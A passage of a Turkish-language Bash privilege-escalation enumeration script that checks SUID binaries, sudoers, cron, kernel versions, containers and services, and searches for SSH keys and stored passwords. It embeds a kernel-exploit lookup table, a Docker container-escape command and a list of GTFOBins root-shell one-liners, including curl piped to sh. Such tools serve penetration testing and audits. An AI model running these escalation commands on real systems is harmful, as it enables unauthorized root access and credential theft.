  echo -e "\e[00;31m[-] Süreç ikilileri ve ilişkili izinler:\e[00m\n$procperm"
  echo -e "\n"
fi

# /etc/init.d binary izinleri
initdread=`ls -la /etc/init.d 2>/dev/null`
if [ "$initdread" ]; then
  echo -e "\e[00;31m[-] /etc/init.d/ binary permissions:\e[00m\n$initdread"
  echo -e "\n"
fi

# Systemd dosyaları
systemdread=`ls -lthR /lib/systemd/ 2>/dev/null`
if [ "$systemdread" ]; then
  echo -e "\e[00;31m[-] /lib/systemd/* config file permissions:\e[00m\n$systemdread"
  echo -e "\n"
fi
}

# Sistem sertleştirme kontrolleri
system_hardening_checks()
{
echo -e "\e[00;33m### SİSTEM SERTLEŞTİRME VE KENAR KONTROLLERİ ###########\e[00m"
for sys in /proc/sys/kernel/yama/ptrace_scope /proc/sys/kernel/dmesg_restrict /proc/sys/kernel/kptr_restrict /proc/sys/kernel/perf_event_paranoid; do
  if [ -r "$sys" ]; then
    value=$(cat "$sys" 2>/dev/null)
    echo -e "\e[00;31m[-] $(basename "$sys") değeri:\e[00m $value"
    if [ "$value" = "0" ]; then
      echo -e "\e[00;33m[!] Dikkat: bu değer zayıf veya açık olabilir\e[00m"
      medium_count=$((medium_count + 1))
      risk_score=$((risk_score + 10))
    fi
  fi
done

if [ -r /etc/sysctl.conf ]; then
  echo -e "\e[00;31m[-] /etc/sysctl.conf içeriği:\e[00m"
  grep -E "kernel\.yama\.ptrace_scope|kernel\.dmesg_restrict|kernel\.kptr_restrict|kernel\.perf_event_paranoid" /etc/sysctl.conf 2>/dev/null || true
  echo -e "\n"
fi

if [ -r /etc/modprobe.d/blacklist.conf ] || [ -r /etc/modprobe.d/blacklist-local.conf ]; then
  echo -e "\e[00;31m[-] Modprobe blacklist dosyaları:\e[00m"
  ls -l /etc/modprobe.d/*.conf 2>/dev/null
  echo -e "\n"
fi

if command_exists getenforce; then
  sest=$(getenforce 2>/dev/null)
  echo -e "\e[00;31m[-] SELinux durumu:\e[00m $sest"
  if [ "$sest" = "Disabled" ]; then
    echo -e "\e[00;33m[!] SELinux devre dışı bırakılmış\e[00m"
    medium_count=$((medium_count + 1))
    risk_score=$((risk_score + 10))
  fi
  echo -e "\n"
fi

if [ -r /sys/module/apparmor/parameters/enabled ]; then
  aa_status=$(cat /sys/module/apparmor/parameters/enabled 2>/dev/null)
  echo -e "\e[00;31m[-] AppArmor durumu:\e[00m $aa_status"
  if [ "$aa_status" != "Y" ] && [ "$aa_status" != "1" ]; then
    echo -e "\e[00;33m[!] AppArmor etkin değil veya yeterli değil\e[00m"
    medium_count=$((medium_count + 1))
    risk_score=$((risk_score + 10))
  fi
  echo -e "\n"
fi

if command_exists getcap; then
  echo -e "\e[00;31m[-] SUID/SGID dosyalarının kapasiteleri (ilk 30):\e[00m"
  getcap -r / 2>/dev/null | head -n 30
  echo -e "\n"
fi
}

# Sudoers ve cron kontrolleri
sudoers_cron_checks()
{
echo -e "\e[00;33m### SUDOERS, CRON VE POLİTİKA KONTROLLERİ #################\e[00m"
if [ -d /etc/sudoers.d ]; then
  echo -e "\e[00;31m[-] /etc/sudoers.d içeriği:\e[00m"
  find /etc/sudoers.d -type f -maxdepth 1 -print -exec ls -l {} \; 2>/dev/null
  find /etc/sudoers.d -type f \( -perm -002 -o -perm -020 \) 2>/dev/null | while read -r f; do
    echo -e "\e[00;33m[!] Yazılabilir sudoers dosyası: $f\e[00m"
    high_count=$((high_count + 1))
    risk_score=$((risk_score + 20))
  done
fi

sudo_nopass=$(grep -R "NOPASSWD" /etc/sudoers /etc/sudoers.d 2>/dev/null || true)
if [ -n "$sudo_nopass" ]; then
  echo -e "\e[00;31m[!] NOPASSWD sudo girdisi bulundu:\e[00m"
  echo "$sudo_nopass"
  high_count=$((high_count + 1))
  risk_score=$((risk_score + 20))
fi

echo -e "\n\e[00;31m[-] Cron ve zamanlayıcı güvenlik kontrolü:\e[00m"
find /etc/cron* /etc/cron.d /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly -maxdepth 2 -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null | while read -r f; do
  echo -e "\e[00;33m[!] Yazılabilir cron dosyası: $f\e[00m"
  high_count=$((high_count + 1))
  risk_score=$((risk_score + 20))
done

if command_exists pkexec; then
  echo -e "\e[00;31m[-] pkexec bulundu ve izinleri:\e[00m"
  ls -l "$(command -v pkexec)" 2>/dev/null
fi

if [ -d /etc/polkit-1/rules.d ]; then
  echo -e "\n\e[00;31m[-] Polkit kuralları ve izinleri:\e[00m"
  find /etc/polkit-1/rules.d -type f -exec ls -l {} \; 2>/dev/null
  find /etc/polkit-1/rules.d -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null | while read -r f; do
    echo -e "\e[00;33m[!] Yazılabilir polkit kuralı: $f\e[00m"
    high_count=$((high_count + 1))
    risk_score=$((risk_score + 20))
done
fi
}

# İlginç dosyalar
interesting_files()
{
echo -e "\e[00;33m### İLGİNÇ DOSYALAR #####################################\e[00m"

# Yararlı dosya konumları
echo -e "\e[00;31m[-] Yararlı dosya konumları:\e[00m"
which nc 2>/dev/null
which netcat 2>/dev/null
which wget 2>/dev/null
which nmap 2>/dev/null
which gcc 2>/dev/null
which curl 2>/dev/null
echo -e "\n"

# Yüklü derleyiciler
compiler=`dpkg --list 2>/dev/null| grep compiler |grep -v decompiler 2>/dev/null && yum list installed 'gcc*' 2>/dev/null| grep gcc 2>/dev/null`
if [ "$compiler" ]; then
  echo -e "\e[00;31m[-] Yüklü derleyiciler:\e[00m\n$compiler"
  echo -e "\n"
fi

# Hassas dosya izinleri
echo -e "\e[00;31m[-] Hassas dosyaları okuyup/yazabiliyor muyuz:\e[00m"
ls -la /etc/passwd 2>/dev/null
ls -la /etc/group 2>/dev/null
ls -la /etc/profile 2>/dev/null
ls -la /etc/shadow 2>/dev/null
echo -e "\n"

# SUID dosyaları
allsuid=`find / -perm -4000 -type f 2>/dev/null`
findsuid=`find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; 2>/dev/null`
if [ "$findsuid" ]; then
  echo -e "\e[00;31m[-] SUID dosyaları:\e[00m\n$findsuid"
  echo -e "\n"
fi

# İlginç SUID dosyaları
intsuid=`find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsuid" ]; then
  echo -e "\e[00;33m[+] İlginç olabilecek SUID dosyaları:\e[00m\n$intsuid"
  echo -e "\n"
fi

# Dünya-yazılabilir SUID dosyaları
wwsuid=`find / -perm -4002 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$wwsuid" ]; then
  echo -e "\e[00;33m[+] Dünya-yazılabilir SUID dosyaları:\e[00m\n$wwsuid"
  echo -e "\n"
fi

# SGID dosyaları
allsgid=`find / -perm -2000 -type f 2>/dev/null`
findsgid=`find / -perm -2000 -type f -exec ls -la {} 2>/dev/null \;`
if [ "$findsgid" ]; then
  echo -e "\e[00;31m[-] SGID dosyaları:\e[00m\n$findsgid"
  echo -e "\n"
fi

# İlginç SGID dosyaları
intsgid=`find / -perm -2000 -type f  -exec ls -la {} \; 2>/dev/null | grep -w $binarylist 2>/dev/null`
if [ "$intsgid" ]; then
  echo -e "\e[00;33m[+] İlginç olabilecek SGID dosyaları:\e[00m\n$intsgid"
  echo -e "\n"
fi

# POSIX capabilities
fileswithcaps=`getcap -r / 2>/dev/null || /sbin/getcap -r / 2>/dev/null`
if [ "$fileswithcaps" ]; then
  echo -e "\e[00;31m[+] POSIX yetenekleri atanmış dosyalar:\e[00m\n$fileswithcaps"
  echo -e "\n"
fi

}

# Gelişmiş SUID/SGID analiz fonksiyonu
advanced_suid_analysis() {
echo -e "\e[00;33m### GELİŞMİŞ SUID/SGID ANALİZİ ##########################\e[00m"

echo -e "\e[00;31m[-] SUID binary'leri taranıyor...\e[00m"
suid_files=`find / -perm -4000 -type f 2>/dev/null | head -50`
if [ "$suid_files" ]; then
  echo -e "\e[00;31m[+] Bulunan SUID dosyaları:\e[00m\n$suid_files"
  
  # GTFOBins ile eşleştirme
  echo -e "\n\e[00;31m[+] GTFOBins ile potansiyel yetki yükseltme kontrolü:\e[00m"
  for file in $suid_files; do
    binary=$(basename "$file")
    if echo "$binarylist" | grep -q "$binary"; then
      echo -e "\e[00;31m[!] KRİTİK: $binary GTFOBins'de mevcut - yetki yükseltme potansiyeli!\e[00m"
    fi
  done
else
  echo -e "\e[00;31m[-] SUID dosyası bulunamadı\e[00m"
fi

echo -e "\n\e[00;31m[-] SGID binary'leri taranıyor...\e[00m"
sgid_files=`find / -perm -2000 -type f 2>/dev/null | head -50`
if [ "$sgid_files" ]; then
  echo -e "\e[00;31m[+] Bulunan SGID dosyaları:\e[00m\n$sgid_files"
else
  echo -e "\e[00;31m[-] SGID dosyası bulunamadı\e[00m"
fi

echo -e "\n\e[00;31m[-] Yazılabilir SUID dosyaları kontrol ediliyor...\e[00m"
yazilabilir_suid=`find / -perm -4000 -writable 2>/dev/null`
if [ "$yazilabilir_suid" ]; then
  echo -e "\e[00;31m[!] KRİTİK - Yazılabilir SUID dosyaları:\e[00m\n$yazilabilir_suid"
fi
}

# Gelişmiş yetki yükseltme vektörleri
privilege_vectors() {
echo -e "\e[00;33m### GELİŞMİŞ YETKİ YÜKSELTME VEKTÖRLERİ ##############\e[00m"

# Docker grup kontrolü
if groups | grep -q docker; then
  echo -e "\e[00;31m[!] KRİTİK: Kullanıcı docker grubunda - container kaçışı mümkün!\e[00m"
  echo -e "Komut: docker run -v /:/hostOS -it ubuntu bash"
fi

# Sudoers analizi
echo -e "\n\e[00;31m[-] Sudoers dosyası analizi:\e[00m"
if [ -r /etc/sudoers ]; then
  echo -e "\e[00;31m[+] Sudoers içeriği:\e[00m"
  grep -v "^#" /etc/sudoers | grep -v "^$"
fi

# Passwordless sudo kontrolü
echo -e "\n\e[00;31m[-] Parolasız sudo kontrolü:\e[00m"
if sudo -n true 2>/dev/null; then
  echo -e "\e[00;31m[!] KRİTİK: Parolasız sudo erişimi mevcut!\e[00m"
fi

# Cron job analiz
echo -e "\n\e[00;31m[-] Cron job analiz:\e[00m"
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
ls -la /etc/cron.* 2>/dev/null

# Yazılabilir cron dosyaları
yazilabilir_cron=`find /etc/cron* -writable 2>/dev/null`
if [ "$yazilabilir_cron" ]; then
  echo -e "\e[00;31m[!] KRİTİK - Yazılabilir cron dosyaları:\e[00m\n$yazilabilir_cron"
fi
}

# Ağ güvenliği analizi
network_security() {
echo -e "\e[00;33m### AĞ GÜVENLİĞİ ANALİZİ ###########################\e[00m"

echo -e "\e[00;31m[-] Açık portlar ve çalışan servisler:\e[00m"
netstat -tulnp 2>/dev/null | head -20

echo -e "\n\e[00;31m[-] ARP tablosu:\e[00m"
arp -a 2>/dev/null

echo -e "\n\e[00;31m[-] Network interface'ler:\e[00m"
ip addr show 2>/dev/null || ifconfig -a 2>/dev/null

echo -e "\n\e[00;31m[-] Yönlendirme tablosu:\e[00m"
ip route 2>/dev/null || route -n 2>/dev/null

echo -e "\n\e[00;31m[-] Güvenlik duvarı kuralları:\e[00m"
iptables -L -n 2>/dev/null || ufw status 2>/dev/null
}

# Yazılım konfigürasyonları ve önemli dosyalar
software_configs()
{
echo -e "\e[00;33m### YAZILIM KONFİGÜRASYONLARI ###########################\e[00m"

# Web sunucusu konfigürasyonları
if [ -r /etc/apache2/apache2.conf ]; then
  echo -e "\e[00;31m[-] Apache2 konfigürasyonu:\e[00m"
  grep -v "^#" /etc/apache2/apache2.conf 2>/dev/null | grep -v "^$" | head -10
  echo
fi

if [ -r /etc/nginx/nginx.conf ]; then
  echo -e "\e[00;31m[-] Nginx konfigürasyonu:\e[00m"
  grep -v "^#" /etc/nginx/nginx.conf 2>/dev/null | grep -v "^$" | head -10
  echo
fi

# Veritabanı konfigürasyonları
if [ -r /etc/mysql/my.cnf ]; then
  echo -e "\e[00;31m[-] MySQL konfigürasyonu:\e[00m"
  grep -v "^#" /etc/mysql/my.cnf 2>/dev/null | grep -v "^$" | head -15
  echo
fi

# SSH konfigürasyonu
if [ -r /etc/ssh/sshd_config ]; then
  echo -e "\e[00;31m[-] SSH daemon konfigürasyonu:\e[00m"
  grep -v "^#" /etc/ssh/sshd_config 2>/dev/null | grep -v "^$"
  echo
fi

# PAM konfigürasyonu
if [ -d /etc/pam.d ]; then
  echo -e "\e[00;31m[-] PAM yapılandırma dosyaları:\e[00m"
  ls -lh /etc/pam.d/ 2>/dev/null | head -20
  echo
fi

# Docker konfigürasyonu
if [ -r /etc/docker/daemon.json ]; then
  echo -e "\e[00;31m[-] Docker daemon konfigürasyonu:\e[00m"
  cat /etc/docker/daemon.json 2>/dev/null
  echo
fi

# Çalışan servisler özeti
echo -e "\e[00;31m[-] Sistem servis durumu (ilk 20):\e[00m"
systemctl list-units --state=running --type=service 2>/dev/null | head -20 || service --status-all 2>/dev/null | head -20
echo
}

# Container ve virtualizasyon analizi
container_analysis() {
echo -e "\e[00;33m### CONTAINER VE VIRTUALİZASYON ANALİZİ ##############\e[00m"

# Docker kontrolü
if command -v docker >/dev/null 2>&1; then
  echo -e "\e[00;31m[+] Docker kurulu:\e[00m"
  docker version 2>/dev/null
  echo -e "\n\e[00;31m[+] Çalışan container'lar:\e[00m"
  docker ps 2>/dev/null
  echo -e "\n\e[00;31m[+] Docker imajları:\e[00m"
  docker images 2>/dev/null
fi

# Kubernetes kontrolü
if command -v kubectl >/dev/null 2>&1; then
  echo -e "\e[00;31m[+] kubectl kurulu:\e[00m"
  kubectl cluster-info 2>/dev/null
fi

# Container içinde mi kontrolü
if [ -f /.dockerenv ]; then
  echo -e "\e[00;31m[!] Docker container içinde çalışıyor!\e[00m"
fi

if [ -f /proc/1/cgroup ]; then
  if grep -q "docker\|lxc" /proc/1/cgroup; then
    echo -e "\e[00;31m[!] Container içinde çalışıyor (cgroup'dan tespit edildi)!\e[00m"
  fi
fi
}

# Exploit öneri sistemi
exploit_suggestions() {
echo -e "\e[00;33m### EXPLOIT ÖNERİ SİSTEMİ ###########################\e[00m"

kernel_version=$(uname -r)
echo -e "\e[00;31m[-] Kernel sürümü: $kernel_version\e[00m"

echo -e "\n\e[00;31m[-] Potansiyel kernel exploit'leri:\e[00m"
echo -e "Dirty COW (CVE-2016-5195) - Kernel < 4.8.3"
echo -e "Dirty Pipe (CVE-2022-0847) - Kernel 5.8 < 5.10.103, 5.15 < 5.15.25, 5.16 < 5.16.11"
echo -e "Stack Clash (CVE-2017-1000364) - Kernel < 4.12"
echo -e "Xfrm (CVE-2021-4039) - Kernel 5.12 < 5.16.11"

echo -e "\n\e[00;31m[-] Araştırma komutları:\e[00m"
echo -e "searchsploit linux kernel $kernel_version"
echo -e "searchsploit linux yetki yukselmesi"

echo -e "\n\e[00;31m[-] Manuel kontrol önerileri:\e[00m"
echo -e "1. GTFOBins: https://gtfobins.github.io/"
echo -e "2. LOLBAS: https://lolbas-project.github.io/"
echo -e "3. Exploit-DB: https://www.exploit-db.com/"
}

# Gelişmiş dosya izin analizi
advanced_permissions() {
echo -e "\e[00;33m### GELİŞMİŞ DOSYA İZİNLERİ ANALİZİ #################\e[00m"

echo -e "\e[00;31m[-] /etc içinde yazılabilir dosyalar:\e[00m"
find /etc -writable -type f 2>/dev/null | head -20

echo -e "\n\e[00;31m[-] Herkes tarafından yazılabilir dosyalar:\e[00m"
find / -type f -perm -002 2>/dev/null | grep -v -E "^/proc|^/sys|^/dev" | head -20

echo -e "\n\e[00;31m[-] Yedek ve geçici dosyalar:\e[00m"
find / -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" -o -name "*.tmp" \) 2>/dev/null | head -20

echo -e "\n\e[00;31m[-] SSH anahtarları:\e[00m"
find / -name "id_rsa*" -o -name "id_dsa*" -o -name "id_ecdsa*" -o -name "id_ed25519*" 2>/dev/null | head -10

echo -e "\n\e[00;31m[-] Konfigürasyon dosyalarındaki parolalar:\e[00m"
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -l "password\|passwd\|pwd" 2>/dev/null | head -10
}

# Process ve servis güvenliği
process_security() {
echo -e "\e[00;33m### PROCESS VE SERVİS GÜVENLİĞİ ###################\e[00m"

echo -e "\e[00;31m[-] Root olarak çalışan process'ler:\e[00m"
ps aux | grep "^root" | head -20

echo -e "\n\e[00;31m[-] Systemd servisleri:\e[00m"
systemctl list-units --type=service --state=running 2>/dev/null | head -20

echo -e "\n\e[00;31m[-] Zayıf process izinleri:\e[00m"
ps aux | awk '$11 != "[" {print $1, $11}' | grep -v "^\[" | head -20

echo -e "\n\e[00;31m[-] Çalışan güvenlik araçları:\e[00m"
ps aux | grep -E "selinux|apparmor|firewall|iptables" | grep -v grep
}

# Yetki Yükseltme Araçları
priv_esc_tools() {
  print_header "YETKİ YÜKSELTME ARAÇLARI"

  tools=(exploitdb searchsploit linpeas linenum pspy pspy64 pspy32)
  for tool in "${tools[@]}"; do
    if command_exists "$tool"; then
      print_finding "BİLGİ" "$tool yüklü"
    else
      echo -e "${YELLOW}[!] $tool yüklü değil veya PATH içinde bulunamadı${NC}"
    fi
  done

  if command_exists "linpeas" || command_exists "linenum"; then
      print_finding "BİLGİ" "LinPEAS veya LinEnum yüklü: yerel taramaya destek sağlanıyor"
  fi
}

linpeas_linenum_extras() {
  print_header "LINPEAS/LINENUM EKSTRALARI"

  echo -e "${CYAN}[-] PATH yazılabilirlik kontrolü:${NC}"
  IFS=":" read -r -a path_dirs <<< "$PATH"
  for dir in "${path_dirs[@]}"; do
    if [ -z "$dir" ]; then
      echo -e "${YELLOW}[!] PATH içinde boş dizin mevcut - potansiyel yol ele geçirme${NC}"
      continue
    fi
    if [ -d "$dir" ] && [ -w "$dir" ]; then
      echo -e "${RED}[!!!] PATH dizini yazılabilir: $dir${NC}"
      risk_score=$((risk_score + 18))
      high_count=$((high_count + 1))
    fi
  done

  echo -e "\n${CYAN}[-] Sudo yetkileri ve NOPASSWD kontrolleri:${NC}"
  if command_exists sudo; then
      sudo_output=$(sudo -n -l 2>/dev/null)
      if [ -n "$sudo_output" ]; then
          echo -e "${GREEN}[+] sudo -l sonucu alındı${NC}"
          echo "$sudo_output" | sed 's/^/   /'
          if echo "$sudo_output" | grep -qi "NOPASSWD"; then
              echo -e "${RED}[!!!] NOPASSWD sudo komutları bulundu${NC}"
              risk_score=$((risk_score + 20))
              high_count=$((high_count + 1))
          fi
      else
          echo -e "${YELLOW}[!] sudo -l çalıştırılamadı veya izin yok${NC}"
      fi
  else
      echo -e "${YELLOW}[!] sudo yüklü değil${NC}"
  fi

  echo -e "\n${CYAN}[-] LD_LIBRARY ve dynamic loader zafiyetleri:${NC}"
  for file in /etc/ld.so.preload /etc/ld.so.conf /etc/ld.so.conf.d; do
      if [ -e "$file" ]; then
          echo -e "${GREEN}[+] Bulundu: $file${NC}"
          ls -ld "$file" 2>/dev/null
          if [ -w "$file" ]; then
              echo -e "${RED}[!!!] Yazılabilir: $file${NC}"
              risk_score=$((risk_score + 20))
              high_count=$((high_count + 1))
          fi
      fi
  done

  echo -e "\n${CYAN}[-] Düzenli görev ve servis dosyası izinleri:${NC}"
  find /etc/cron* /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system -maxdepth 2 -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null | while read -r f; do
      echo -e "${RED}[!!!] Yazılabilir görev/servis dosyası: $f${NC}"
      risk_score=$((risk_score + 18))
      high_count=$((high_count + 1))
  done

  echo -e "\n${CYAN}[-] Herkes tarafından yazılabilir dosya/dizin taraması (hızlı):${NC}"
  find / -xdev \( -type f -perm -002 -o -type d -perm -002 \) ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | head -50 | while read -r f; do
      echo -e "${YELLOW}[!] Herkes tarafından yazılabilir: $f${NC}"
      medium_count=$((medium_count + 1))
      risk_score=$((risk_score + 10))
  done

  echo -e "\n${CYAN}[-] /etc/shadow erişim kontrolü:${NC}"
  if [ -r /etc/shadow ]; then
      echo -e "${RED}[!!!] /etc/shadow okunabiliyor!${NC}"
      critical_count=$((critical_count + 1))
      risk_score=$((risk_score + 25))
  else
      echo -e "${GREEN}[+] /etc/shadow okunamaz${NC}"
  fi

  echo -e "\n${CYAN}[-] Root SSH anahtarı ve .bash_history kontrolleri:${NC}"
  for file in /root/.ssh/id_rsa /root/.ssh/id_dsa /root/.bash_history /root/.zsh_history; do
      if [ -r "$file" ]; then
          echo -e "${RED}[!!!] Erişilebilir root dosyası: $file${NC}"
          medium_count=$((medium_count + 1))
          risk_score=$((risk_score + 15))
      fi
  done

  echo -e "\n${CYAN}[-] Zamanlanmış komutları hızlı kontrol etme:${NC}"
  find /etc/cron* -type f -perm -o+w 2>/dev/null | head -20 | while read -r f; do
      echo -e "${RED}[!!!] Yazılabilir cron dosyası: $f${NC}"
      high_count=$((high_count + 1))
      risk_score=$((risk_score + 20))
  done
}

# Gelişmiş Akıllı Zafiyet Tespit Sistemi (İnternetsiz)
advanced_vulnerability_scanner() {
echo -e "\e[00;33m### GELİŞMİŞ AKILLI ZAFİYET TARAMASI ##############\e[00m"

# Kernel versiyon analizi
kernel_version=$(uname -r | cut -d- -f1)

echo -e "\e[00;31m[-] Detaylı Kernel Analizi: $kernel_version\e[00m"

# Gelişmiş kernel zafiyet veritabanı
declare -A advanced_exploits=(
    ["2.6.22-2.6.24"]="CVE-2008-0600 - vmsplice Yerel Yetki Yükseltmesi|https://www.exploit-db.com/exploits/5092"
    ["2.6.17-2.6.24"]="CVE-2008-0001 - dmesg Restriction Bypass|https://www.exploit-db.com/exploits/5093"
    ["2.6.19-2.6.31"]="CVE-2009-1185 - pipe.c Yerel Yetki Yükseltmesi|https://www.exploit-db.com/exploits/3334"
    ["2.6.36-3.0"]="CVE-2010-4259 - Econet Yetki Yükseltmesi|https://www.exploit-db.com/exploits/15704"
    ["3.13-3.19"]="CVE-2015-1328 - overlayfs Yetki Yükseltmesi|https://www.exploit-db.com/exploits/37292"
    ["4.4-4.14"]="CVE-2016-5195 - Dirty COW|https://github.com/dirtycow/dirtycow.github.io"
    ["5.8-5.16"]="CVE-2022-0847 - Dirty Pipe|https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploit"
    ["5.10-5.15"]="CVE-2021-3493 - OverlayFS|https://www.exploit-db.com/exploits/50809"
    ["5.4-5.6"]="CVE-2020-8835 - BPF|https://www.exploit-db.com/exploits/50808"
    ["5.11-5.12"]="CVE-2021-22555 - Netfilter|https://www.exploit-db.com/exploits/50436"
    ["5.13-5.14"]="CVE-2021-3360 - eBPF|https://www.exploit-db.com/exploits/50070"
)

echo -e "\n\e[00;31m[-] Gelişmiş Zafiyet Kontrolü:\e[00m"
for version_range in "${!advanced_exploits[@]}"; do
    min=$(echo "$version_range" | cut -d- -f1)
    max=$(echo "$version_range" | cut -d- -f2)
    if version_in_range "$kernel_version" "$min" "$max"; then
        exploit_info="${advanced_exploits[$version_range]}"
        cve=$(echo "$exploit_info" | cut -d'|' -f1)
        url=$(echo "$exploit_info" | cut -d'|' -f2)
        echo -e "\e[00;31m[!!!] KRİTİK ZAFİYET: $cve\e[00m"
        echo -e "\e[00;33m      -> Detay: $url\e[00m"
        log_finding "CRITICAL" "$cve | $url"
        critical_count=$((critical_count + 1))
        risk_score=$((risk_score + 30))
    fi
done
}

# Gelişmiş SUID Binary Analizi
advanced_suid_scanner() {
echo -e "\e[00;33m### GELİŞMİŞ SUID/SGID TARAMASI ################\e[00m"

# GTFOBins gelişmiş veritabanı
declare -A advanced_suid_exploits=(
    ["find"]="find /etc/passwd -exec /bin/sh \;|find / -name '*' -exec /bin/sh \;"
    ["vim"]="vim -c ':!/bin/sh'|vim -c ':!sudo -i'"
    ["nano"]="nano /etc/passwd|nano /etc/shadow"
    ["nmap"]="nmap --interactive|nmap --script=safe"
    ["awk"]="awk 'BEGIN {system(\"/bin/sh\")}'|awk 'BEGIN {system(\"/bin/bash\")}'"
    ["perl"]="perl -e 'exec \"/bin/sh\";'|perl -e 'exec \"/bin/bash\";'"
    ["python"]="python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'|python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
    ["bash"]="bash -p|bash --norc -p"
    ["sh"]="sh -p|sh --norc -p"
    ["cp"]="cp /bin/sh /tmp/rootshell; chmod +s /tmp/rootshell|cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
    ["mv"]="mv /bin/sh /tmp/rootshell; chmod +s /tmp/rootshell|mv /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"
    ["tar"]="tar cf /dev/null /etc/passwd --checkpoint=1 --checkpoint-action=exec=/bin/sh|tar xf /tmp/exploit.tar --checkpoint=1 --checkpoint-action=exec=/bin/sh"
    ["zip"]="zip /tmp/test.zip /etc/passwd -T -TT '/bin/sh'|zip /tmp/test.zip /etc/shadow -T -TT '/bin/sh'"
    ["strace"]="strace -o /dev/null /bin/sh|strace -o /dev/null /bin/bash"
    ["gdb"]="gdb -nx -ex '!sh' -ex quit|gdb -nx -ex '!bash' -ex quit"
    ["less"]="less /etc/passwd !/bin/sh|less /etc/shadow !/bin/sh"
    ["more"]="more /etc/passwd !/bin/sh|more /etc/shadow !/bin/sh"
    ["scp"]="scp -S /bin/sh x x:|scp -S /bin/bash x x:"
    ["rsync"]="rsync -e 'sh -c sh 0<&2 1>&2' x|rsync -e 'bash -c bash 0<&2 1>&2' x"
    ["tcpdump"]="tcpdump -w - -i lo 'icmp[icmptype] = icmp-echo' -z /bin/sh|tcpdump -w - -i lo 'icmp[icmptype] = icmp-echo' -z /bin/bash"
    ["wget"]="wget --use-askpass=/bin/sh http://localhost|wget --use-askpass=/bin/bash http://localhost"
    ["curl"]="curl http://localhost/file|sh|curl http://localhost/file|bash"
)

echo -e "\e[00;31m[-] Gelişmiş SUID Binary Analizi:\e[00m"
mapfile -t suid_files < <(find / -perm -4000 -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | sort | uniq | head -50)
if [ ${#suid_files[@]} -gt 0 ]; then
  echo -e "\e[00;31m[+] Bulunan SUID dosyaları:\e[00m"
  printf '%s\n' "${suid_files[@]}"
  echo -e "\n\e[00;31m[+] GTFOBins ile potansiyel yetki yükseltme kontrolü:\e[00m"
  for file in "${suid_files[@]}"; do
    binary_name=$(basename "$file")
    if echo "$binarylist" | grep -q "\b$binary_name\b"; then
      echo -e "\e[00;31m[!] KRİTİK: $binary_name GTFOBins'de mevcut - yetki yükseltme potansiyeli!\e[00m"
    fi
    if [[ -n "${advanced_suid_exploits[$binary_name]}" ]]; then
      echo -e "\e[00;33m      -> Exploit yöntemleri kontrol edilecek: $binary_name\e[00m"
    fi
  done
else
  echo -e "\e[00;31m[-] SUID dosyası bulunamadı\e[00m"
fi

echo -e "\n\e[00;31m[-] SGID Binary Analizi:\e[00m"
mapfile -t sgid_files < <(find / -perm -2000 -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null | sort | uniq | head -50)
if [ ${#sgid_files[@]} -gt 0 ]; then
  for sgid_file in "${sgid_files[@]}"; do
    [ -f "$sgid_file" ] || continue
    echo -e "\e[00;32m[+] SGID: $sgid_file\e[00m"
    medium_count=$((medium_count + 1))
    risk_score=$((risk_score + 8))
  done
else
  echo -e "\e[00;31m[-] SGID dosyası bulunamadı\e[00m"
fi
}

# Gelişmiş Servis ve Port Analizi
advanced_service_scanner() {
echo -e "\e[00;33m### GELİŞMİŞ SERVİS VE PORT ANALİZİ ###########\e[00m"

# Servis port haritası
declare -A service_ports=(
    ["21"]="FTP - Potansiyel anonymous login"
    ["22"]="SSH - Brute force, weak credentials"
    ["23"]="Telnet - Clear text protocol"
    ["25"]="SMTP - Mail relay, credentials"
    ["53"]="DNS - Zone transfer, cache poisoning"
    ["80"]="HTTP - Web vulnerabilities"
    ["110"]="POP3 - Credentials"
    ["143"]="IMAP - Credentials"
    ["443"]="HTTPS - SSL/TLS issues"
    ["993"]="IMAPS - SSL/TLS issues"
    ["995"]="POP3S - SSL/TLS issues"
    ["3306"]="MySQL - SQL injection, credentials"
    ["5432"]="PostgreSQL - SQL injection, credentials"
    ["6379"]="Redis - No authentication"
    ["27017"]="MongoDB - No authentication"
    ["5984"]="CouchDB - Default credentials"
    ["11211"]="Memcached - No authentication"
    ["8080"]="HTTP Alt - Web vulnerabilities"
    ["8443"]="HTTPS Alt - SSL/TLS issues"
)

echo -e "\e[00;31m[-] Detaylı Port ve Servis Analizi:\e[00m"
netstat -tulnp 2>/dev/null | grep "LISTEN" | while read line; do
    port=$(echo "$line" | awk '{print $4}' | cut -d: -f2)
    service=$(echo "$line" | awk '{print $7}' | cut -d/ -f2)
    
    if [[ -n "$port" ]] && [[ -n "${service_ports[$port]}" ]]; then
        service_info="${service_ports[$port]}"
        echo -e "\e[00;33m[!] AÇIK PORT $port: $service_info\e[00m"
        echo -e "\e[00;32m      -> Servis: $service\e[00m"
        log_finding "HIGH" "Açık Port $port | $service_info | $service"
        high_count=$((high_count + 1))
        risk_score=$((risk_score + 12))
    elif [[ -n "$port" ]]; then
        echo -e "\e[00;32m[+] Port $port: $service\e[00m"
        low_count=$((low_count + 1))
        risk_score=$((risk_score + 3))
    fi
done

# Servis versiyon tespiti
echo -e "\n\e[00;31m[-] Servis Versiyon Tespiti:\e[00m"

# Web sunucuları
if command -v apache2 >/dev/null 2>&1; then
    apache_version=$(apache2 -v 2>/dev/null | grep "Server version")
    echo -e "\e[00;32m[+] Apache: $apache_version\e[00m"
fi

if command -v nginx >/dev/null 2>&1; then
